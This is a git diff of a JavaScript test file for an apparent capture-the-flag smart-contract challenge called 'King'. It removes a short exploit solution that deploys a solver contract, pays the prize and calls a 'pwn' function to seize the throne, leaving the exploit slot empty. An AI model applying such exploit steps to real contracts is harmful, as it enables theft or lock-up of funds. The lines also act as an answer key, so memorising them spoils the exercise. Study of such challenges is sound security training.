@@ -26,16 +26,7 @@ describe('[Challenge] King', function () {
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const KingSolverFactory = await ethers.getContractFactory('KingSolver', attacker);
-        this.KingSolver = await KingSolverFactory.deploy();
-        //check the prize needed for winning
-        let prize = await this.target.prize();
-        console.log(`\t prize   : ${prize} wei`);
-        //claim the throne
-        let depositeTX = await this.KingSolver.deposite({value:prize}); await depositeTX.wait();
-        let pwnTX = await this.KingSolver.pwn(this.target.address); await pwnTX.wait();
-        console.log(`\t King    : ${await this.target._king()}`);
-        console.log(`\t attacker: ${this.KingSolver.address}`);
+        
     }).timeout(0);
 
     after(async () => {
